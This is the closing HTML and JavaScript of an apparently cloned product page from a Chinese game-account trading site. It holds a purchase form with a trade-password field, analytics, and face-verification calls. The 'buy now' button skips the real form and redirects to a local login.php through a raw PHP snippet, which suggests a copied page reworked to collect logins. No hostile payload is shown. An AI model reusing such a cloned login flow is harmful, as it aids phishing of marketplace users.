<div id="is_selected" data-flag="1" class="selected"></div>
<span>给卖家打个招呼！</span>
</div>
<div class="message-bnt">确定</div>
</div>
</div>
<div class="b-btn-icon-box">
            <div class="title-title-right" id="favorite">
<a class="fav" href="javascript:;" datasrc="/trades/list/setfavorite?tradeid=42039020"></a>
<p>收藏</p>
</div>
    </div>
<a class="joindb"><div class="dbsty"><img src="./img/contrast/duibi1.png"><span>已对比</span></div></a>
<input id="appUserId" value="" type="hidden">
<input id="sellUserId" value="4110962" type="hidden">
<div class="b-btn-rectangle-box">
<div class="b-btn-rectangle b-btn-rectangle-buy" style="width:100%">
                             <a  onClick="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'" class="bta js-trademsgbtn" data-goods="1" data-tradeid="42039020" data-facetradeid="42039020">
立即购买</a>
                    </div>
</div>
                                <form method="post" name="myform" data-s="1" action="/user/buy/trade" role="form" id="buyform" data-ajax="false"><input type="hidden" name="tradeid" value="42039020" id="js-b-limit-tradeid"><input type="hidden" name="amount" id="amount" value="1"><input type="hidden" name="_csrf" value="zJVCH-5_Hc6nm2Zr8yerndnxfrHpXvDgIbIO-vRWOIj1ojF6tBUsrODWHACRfpz_kKNK4bYphIVJn2mXzAFKyw=="><input type="hidden" name="account" value=""><section class="w-buy-mask" id="popupLogin"><div data-role="popup" data-theme="a" class="w-buy-form"><div class="w-buy-form-box"><h3 class="w-buy-form-box">请输入交易密码</h3><input type="password" name="passwd" id="pw" value="" placeholder="请输入交易密码" data-theme="a" class="w-buy-form-box-input"><a id="btn_buysubmityueding" href="#" data-rel="submit" class="w-buy-form-box-a">购买</a></div></div></section><section class="w-buy-mask" id="continuere"><div data-theme="a" class="w-buy-form"><div class="w-buy-form-box"><h3 class="w-buy-form-box-h3">请输入首充账号</h3><input type="text" name="account" placeholder="请输入首充账号" data-theme="a" class="w-buy-form-box-input"><a id="btn_continue" href="#" data-rel="submit" class="w-buy-form-box-a">购买</a></div></div></section></form><input type="hidden" id="js-b-limit-userid" value=""><input type="hidden" id="js-b-limit-sellerid" value="4110962"><input type="hidden" id="js-b-limit-gameid" value="2256"><input type="hidden" id="js-b-limit-clientid" value="28"><input type="hidden" id="kf-couponId" value=""><input type="hidden" id="kf-mobile" value=""><input type="hidden" id="is_kuaifa" value="0"></section><script src="./static/home/widget/goodsdetail/buy/crypto-js_c34eadc.js"></script><script src="./static/home/widget/goodsdetail/buy/tripledes_62fd1a3.js"></script><script src="./static/home/widget/goodsdetail/buy/mode-ecb_d515ccd.js"></script></div><script></script><script type="text/javascript" src="./js/im/jquery.min.js"></script><script type="text/javascript" src="./js/im/NIM_Web_NIM_v6.1.0.js"></script><script type="text/javascript" src="./js/im/imList1.js"></script>    <script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "http://hm.baidu.com/hm.js?99e55629a8abb60a322e77b53fd2f343";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>
<script>
    if (('standalone' in window.navigator) && window.navigator.standalone) {
        var noddy, remotes = false;
        document.addEventListener('click', function (event) {
            noddy = event.target;
            while (noddy.nodeName !== 'A' && noddy.nodeName !== 'HTML') noddy = noddy.parentNode;
            if ('href' in noddy && noddy.href.indexOf('http') !== -1 && (noddy.href.indexOf(document.location
                .host) !== -1 || remotes)) {
                event.preventDefault();
                document.location.href = noddy.href;
            }
        }, false);
    }

    function downStatistics(Identification, name, other, channelCode) {
        var u = navigator.userAgent;
        var is_ios = false
        if (u.indexOf("iPhone") > -1 || u.indexOf("iOS") > -1) {
            is_ios = true
        } else {
            is_ios = false
        }

        // Identification :页面标识，
        // name：页面名称，
        // other：其他参数
        // 统计接口
        console.log(channelCode)
        if ((is_ios && other == 'H5下载页') || !is_ios) {
            $.ajax({
                type: "post",
                url: "/indexpage/index/record-download",
                data: {
                    "pageId": Identification,
                    "pageName": name,
                    'channelCode': channelCode
                },
                dataType: "json",
                success: function (data) {
                    if (data.errcode == 0) {
                        location.href = data.data.downloadUrl;
                    } else {
                        alert(data.msg)
                    }
                }
            });
        } else {
            $.ajax({
                type: "post",
                url: "/indexpage/index/record-enter-downloadpage",
                data: {
                    "pageId": Identification,
                    "pageName": name,
                    'channelCode': channelCode
                },
                dataType: "json",
                success: function (data) {
                    if (data.errcode == 0) {
                        location.href = "/indexpage/index/downloadapp?name=" + name
                    } else {
                        alert(data.msg)
                    }
                }
            });

        }
    }
    //百度统计
    setTimeout(function () {
        var goodsname = "";
        var gname = "";
        var trade_id = "";
        if ($("#js-agoodsid").val() === "3" || $("#goodsid").val() === "3" || $("#goodsidFlag").val() === "3") {
            goodsname = "首充号";
            var gname1 = $("#header_app").children(".header-center").text();
            var gname2 = $("#sc_game_name").text();
            if (gname1 !== "" && gname1 !== null) {
                gname = gname1.replace('\n', '');
            }
            trade_id = $("#zj-goodsdetail-goodsid").val() != undefined ? $("#zj-goodsdetail-goodsid").val() :
                "";
            if (gname !== "" && gname1 !== null) {
                gname = gname + "-" + goodsname;
                window._hmt && window._hmt.push(['_trackEvent', "首充游戏列表", gname, ""]);
            } else if (trade_id != "" && gname2 !== "" && $("#goodsid").val() === "3") {
                var deail_html = "首充商品详情-" + gname2;
                window._hmt && window._hmt.push(['_trackEvent', "首充商品详情", deail_html, ""]);
            } else {
                window._hmt && window._hmt.push(['_trackEvent', goodsname, "", ""]);
            }
        }
    }, 1000);
    //实名认证
    var face_verifyType = '';
    var face_callback;
    var face_evetn;
    var face_verifyRequired;
    function recognition(callback, evetn,type) {
        face_callback = callback
        face_evetn = evetn
        $.ajax({
            type: "post",
            url: "/user/face-recognition/info",
            data: {
                "page": type,
                'gameid':evetn.attr('data-gameid'),
                'clientid':evetn.attr('data-clientid'),
                'tradeid':evetn.attr('data-facetradeid'),
            },
            dataType: "json",
            success: function (data) {
                if (data.errcode == 0) {
                    if (data.data.verifyRequired != 0) {
                        $('#face-box').show()
                        if(data.data.certNo || data.data.realName){
                            $('#certNo-input').val(data.data.certNo)
                            $('#realName-input').val(data.data.realName)
                            $("#certNo-input").attr("disabled","disabled");
                            $("#realName-input").attr("disabled","disabled");
                            $(".face-input-box").css("background","#f8f8f8")
                        }
                        if(data.data.verifyRequired == 1){
                            $('.btn-rn').html('人脸认证')
                        }else{
                            $('.btn-rn').html('确认')
                        }
                        face_verifyType = data.data.verifyType
                        face_verifyRequired =  data.data.verifyRequired
                    }else{
                        face_callback(evetn)
                    }
                }else if(data.errcode == 100001){
                    location.href = '/siteauth/auth/login?returnurl=' + window.location.href;
                }else {
                    showToast(data.msg, 1000)
                }
            }
        });
    }
    // 封装的弹窗
    var toastTimer;
    function showToast(msg, duration) {
        clearTimeout(toastTimer);
        var ToastBox = document.getElementsByClassName('toastDiv-box')[0];
        if (ToastBox) document.body.removeChild(ToastBox);//防止重复弹出
        duration = isNaN(duration) ? 3000 : duration;
        var m = document.createElement('div');
        m.className = 'toastDiv-box';
        m.innerHTML = msg;
        m.style.cssText = "width: 70%;min-width: 150px;opacity: 0.7;height: auto;color: rgb(255, 255, 255);text-align: center;padding: 10px;border-radius: 5px;position: fixed;top: 40%;left: 15%;z-index: 999999;background: rgb(0, 0, 0);font-size: 14px;overflow: hidden;";
        document.body.appendChild(m);
        toastTimer = setTimeout(function () {
            var d = 0.5;
            m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d + 's ease-in';
            m.style.opacity = '0';
            setTimeout(function () { document.body.removeChild(m); }, d * 1000);
        }, duration);
    }
</script>
<script type="text/javascript" src="./static/common/static/mod.js"></script>
<script type="text/javascript" src="./static/common/static/js/lib/zepto.min.js"></script>
<script type="text/javascript" src="./static/common/static/js/lib/sensor.js"></script>
<script type="text/javascript" src="./static/common/static/js/lib/sensorprepropties.js"></script>
<script type="text/javascript" src="./static/common/static/pkg/common_403ee1b.js"></script>
<script type="text/javascript" src="./static/common/static/js/lib/FastClick.js"></script>
<script type="text/javascript" src="./static/common/static/js/lib/weui/weui.js"></script>
<script type="text/javascript" src="./static/home/static/pkg/goodsdetail_dd70f3f.js"></script>
<script type="text/javascript" src="./static/common/static/js/goodsdetail/recommend_862c7fc.js"></script>
<script type="text/javascript">!function(){    require("home.static.js.goodsdetail.goodsdetail");    }();
!function(){        require("common.static.js.goodsdetail.recommend");    }();
!function(){require("common.widget.common.authentication.face")}();
!function(){require("common.widget.common.topNew.topNew_toppic")}();
!function(){require('home.widget.goodsdetail.swiper.myswiper');}();
!function(){    require("home.widget.goodsdetail.icons.icons");}();
!function(){require("home.widget.goodsdetail.shop.shop");}();
!function(){     require("home.widget.goodsdetail.look.look");}();
!function(){require("common.widget.common.sdk.sdkad")}();
!function(){require("common.widget.common.friendlink.friendlink")}();
!function(){    require("home.widget.goodsdetail.buy.buy");}();</script></body><div id="qbTrans-pageTrans-dialog" style="display: none;"><!----> <span class="qbTrans-pageTrans-dialog-success" style="display: none;"></span> <span class="qbTrans-pageTrans-dialog-guide" style="display: none;"></span> <span class="qbTrans-pageTrans-dialog-text">是否将当前网页翻译成中文</span> <div id="qbTrans-pageTrans-dialog-btn" class="qbTrans-pageTrans-dialog-btn">网页翻译</div> <!----> <!----> <div class="qbTrans-pageTrans-dialog-close"><span class="qbTrans-pageTrans-dialog-close-text">关闭</span></div></div></html>